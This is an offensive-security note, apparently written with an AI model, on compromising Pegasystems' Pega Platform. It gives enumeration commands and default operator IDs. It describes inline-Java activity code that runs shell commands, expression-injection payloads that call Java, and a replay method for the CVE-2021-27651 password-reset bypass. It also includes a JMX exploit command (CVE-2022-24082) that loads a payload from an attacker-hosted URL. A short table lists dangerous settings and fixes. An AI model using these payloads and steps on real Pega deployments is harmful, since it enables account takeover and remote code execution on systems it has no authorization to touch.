# Pega

#Pega #Pegasystems #PegaInfinity #webservices #RCE #expressioninjection #lowcode

## What is Pega?

Pega Platform (a.k.a. **Pega Infinity**) is Pegasystems' low-code BPM/CRM platform — enterprise workflow, case management and customer-service apps built by "developers" in a browser-based **Dev Studio / App Studio** rather than in source files. It runs as a Java web app (`prweb`) on Tomcat/WebLogic/JBoss/WebSphere backed by a relational DB, and everything — rules, activities, expressions, UI — is stored as **rules** in that DB and evaluated at runtime by the PegaRULES engine.

That runtime rule engine is the whole point on an engagement: Pega's **expression language can call Java**, and **activities can contain inline Java steps**. Anything that gets attacker-controlled text evaluated as a Pega expression, or that lets you author a rule, is code execution as the app-server user. The realistic path is *authenticated* (reach Dev Studio → write a Java-calling rule) or *application-level* (an app that evaluates user input as an expression); a pre-auth foothold usually comes from a separate bug (auth bypass CVE-2021-27651, or exposed JMX CVE-2022-24082).

- Port **TCP 80/443** — `prweb` behind a reverse proxy (production default)
- Port **TCP 8080/8443** — standalone Tomcat
- Port **TCP 9999 / custom** — **JMX** (RMI) when management is enabled — the CVE-2022-24082 surface
- Web root: `/prweb/` — servlet `/prweb/PRServlet`, auth at `/prweb/PRAuth`, REST at `/prweb/api/v1/` and `/prweb/PRRestService`
- Session cookie: `PegaRULESSession` / `PegaRULESSessionId` — a reliable fingerprint
- Default operator ID: `administrator@pega.com` (password is set at install — try install-time defaults / weak values, don't assume a universal one)

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|NMAP]] | Fingerprint `prweb`/version and find the exposed JMX/RMI port |
| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept the password-reset flow (CVE-2021-27651), craft rule/expression requests, hunt expression sinks |
| [[Tools/File Transfer/cURL\|cURL]] | Probe `/prweb/` endpoints and version tells |

External tooling (no vault note — upstream): **MOGWAI LABS `mjet`/`jmxploit`** (JMX MLet RCE for CVE-2022-24082) and **`ysoserial`** (Java gadget-chain payloads for the deserialization step).

---

## Enumeration

```bash
# Version / platform fingerprint
nmap -p 80,443,8080,8443 --script http-title,http-headers -sV <target>
curl -sik https://<target>/prweb/ | grep -iE 'pega|prweb|PegaRULESSession'

# Login page + version tells (build shows in JS/asset paths and the PRAuth page)
curl -sk https://<target>/prweb/PRAuth/app/default | grep -iEo 'pega[^"]*|[0-9]+\.[0-9]+\.[0-9]+'

# JMX / RMI (CVE-2022-24082) — the unauth RCE surface on-prem
nmap -p 9999,1099,7091,9004 --script rmi-dumpregistry,rmi-vuln-classloader -sV <target>
```

| Tell | Meaning |
|---|---|
| `PegaRULESSession` cookie | Confirms Pega Platform |
| `/prweb/PRAuth`, `/prweb/PRServlet` | Pega servlet endpoints present |
| Open RMI/JMX port | Candidate for CVE-2022-24082 (see Attack Vectors) |
| Version `< 8.5.3` | In range for the CVE-2021-27651 auth-bypass chain |

---

## Connect / Access

```bash
# Interactive login (Dev Studio is the goal — it exposes the rule/expression editors)
#   https://<target>/prweb/PRAuth/app/default            -- operator login
#   https://<target>/prweb/app/default/.../Designer      -- Dev Studio (once authed)

# REST API (needs an operator token/basic auth)
curl -sk -u 'administrator@pega.com:<pass>' https://<target>/prweb/api/v1/data/...
```

Getting a valid operator session is the pivot. Options, in order of preference: looted/weak/default operator creds → the CVE-2021-27651 auth bypass → an application-level expression sink that needs no login.

---

## Attack Vectors

Pega "expression language injection" is really **"attacker-controlled text reaching the PegaRULES expression evaluator, which can call Java."** Work it as: *reach the evaluator → make it call Java → shell*.

### The expression → Java mechanism (why this is RCE)

Pega expressions (used in **Declare Expression** rules, **When** rules, the **Expression Builder**, and control values) reference properties and call **function rules**, which are compiled Java:

```
.PropertyName                         // property on the primary page
Page.Property  /  Param.Name          // page / parameter refs
@(RuleSet:Library).function(args)     // call a function rule (Java);
                                      //   RuleSet defaults to Pega-RULES, Library to 'default'
@Pega-RULES:Utilities.callActivity(pyWorkPage, MyActivity, tools.getParameterPage())
```

Because a function call in an expression resolves to Java, and **activities allow inline Java steps** (fully-qualified class names, no `import`), an expression you control is a Java call you control. This is the same class of problem as Struts/Confluence OGNL or Spring SpEL injection — see [[Class notes/HTB Academy/CWES Claude/Server-Side Attacks|Server-Side Attacks]] for the general SSTI/expression-injection model.

### Vector 1 — Authenticated rule authoring → RCE (the reliable path)

With Dev Studio access (default/looted creds, or via the auth bypass below):

1. **Java-step activity.** Create an Activity rule with a **Java** step and inline code, then run it (Actions → Run, or invoke it by URL/expression):
   ```java
   // inline Java in an activity step — no imports allowed, use FQCNs
   String o = new java.util.Scanner(
       java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id"}).getInputStream()
   ).useDelimiter("\\A").next();
   oLog.infoForced(o);
   ```
2. **Function rule + expression.** Author a **Function** (Java) rule in a writable RuleSet, then call it from any expression sink: `@(MyRuleSet:MyLib).pwn("id")`.
3. **Call an activity from an expression:** `@Pega-RULES:Utilities.callActivity(...)` to trigger the Java-step activity from a Declare Expression / When rule.

> [!warning] This is the well-documented "administrator RCE" everyone means by Pega expression injection — but it needs an authenticated designer context. The public CVE-2021-27651 PoC deliberately omits the exact post-auth request, saying only "RCE via any of the accepted administrator code-execution vectors (activities, functions, templating)." Expect to build the request yourself in Dev Studio.

### Vector 2 — Application-level expression sink (true injection, app-specific)

Some Pega apps evaluate **user-supplied text as an expression** — a search/filter control, a rule that resolves `.pyExpression`/a dynamic property, or a customization that passes request input into an evaluated field. If you find one, inject a function call rather than a value:

```
# where a numeric/property value is expected, try a function-call expression
@(Pega-RULES:default).toString(@Pega-RULES:Utilities.callActivity(...))
```

Confirm evaluation first with a benign arithmetic/string expression (`@Pega-RULES:default.add(7,7)` → 14), the same way you fingerprint SSTI, before escalating.

### Vector 3 — CVE-2021-27651 auth bypass → Vector 1 (Pega Infinity 8.2.1–8.5.2)

The password-reset flow can be abused to change **any** operator's password (including `administrator@pega.com`) by posting straight to the change-password step and skipping the confirmation/challenge. Intercept the reset in Burp, replay the final POST for the target operator, then log in and proceed to Vector 1. Fixed in 8.5.3 / patched 8.x.

### Vector 4 — CVE-2022-24082, exposed JMX → deserialization RCE (unauth, on-prem)

Independent of the expression engine but the usual pre-auth foothold on **on-prem** Pega ≥ 8.1.0 (≤ 8.3.7 as exploited) where the **JMX/RMI port is reachable and unfiltered**. Use the MOGWAI LABS JMX toolkit to load a malicious MLet / drive a `ysoserial` gadget chain:

```bash
# MOGWAI LABS mjet / jmxploit — deploy an MLet-based command handler over JMX
python3 mjet.py <target> <jmx_port> install exec http://<attacker>/  # then run commands
```

Not present on **PegaCloud** (JMX not exposed by design). Fix = filter unused ports / restrict JMX.

### Other CVEs worth version-checking

| CVE | Class | Note |
|---|---|---|4
| CVE-2021-27651 | Auth bypass → RCE | Password-reset bypass, 8.2.1–8.5.2 — the way in for Vector 1 |
| CVE-2022-24082 | Deserialization RCE | Exposed JMX, on-prem ≥ 8.1.0; CVSS 9.8; MOGWAI toolkit |
| CVE-2023-26465 | Stored XSS | Markdown/@-mention bypass of the XSS filter |
| CVE-2023-50168 | XXE | Weakly-configured XML parser |

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| JMX/RMI port reachable + unfiltered | Unauth deserialization RCE (CVE-2022-24082) |
| Pega Infinity `< 8.5.3` | Password-reset auth bypass → admin (CVE-2021-27651) |
| Default/weak operator IDs (`administrator@pega.com`) | Direct Dev Studio access → Java-rule RCE |
| Dev Studio / Designer exposed to low-priv or internet users | Any designer can author a Java function/activity = RCE |
| Application evaluates user input as an expression | True expression-language injection → function-call RCE |
| Unlocked / writable production RuleSets | Attacker can create new Function/Activity rules |
| `prweb` exposed without WAF / URL filtering | Direct reach to `PRServlet`/`PRAuth` attack surface |

---

## Quick Reference

| Goal | Command / Action |
|---|---|
| Fingerprint Pega | `curl -sik https://host/prweb/ \| grep -i PegaRULESSession` |
| Find JMX surface | `nmap -p 9999,1099 --script rmi-dumpregistry host` |
| Operator login | `https://host/prweb/PRAuth/app/default` |
| Confirm expression eval | `@Pega-RULES:default.add(7,7)` → `14` |
| Call Java from expression | `@(RuleSet:Library).function(args)` |
| Call activity from expression | `@Pega-RULES:Utilities.callActivity(pyWorkPage, MyActivity, tools.getParameterPage())` |
| Inline-Java RCE (activity step) | `java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id"})` |
| Auth bypass (8.2.1–8.5.2) | CVE-2021-27651 — replay reset POST for target operator |
| Unauth RCE (exposed JMX) | CVE-2022-24082 — MOGWAI `mjet` + `ysoserial` |

---

> [!note] **See also** — the general expression/template-injection model (OGNL/SpEL/Jinja fingerprint → RCE) in [[Class notes/HTB Academy/CWES Claude/Server-Side Attacks|Server-Side Attacks]]; sibling Java-app RCE surfaces [[Services/Web Services/WebLogic|WebLogic]], [[Services/Web Services/Confluence|Confluence]] (OGNL), and JMX exposure notes in [[Services/Web Services/JMX|JMX]]. Java deserialization payloads via [[Tools/Payloads & Shells/ysoserial.net|ysoserial]] (Java-gadget analog).

---

*Created: 2026-09-22*
*Updated: 2026-09-22*
*Model: claude-opus-4-8*
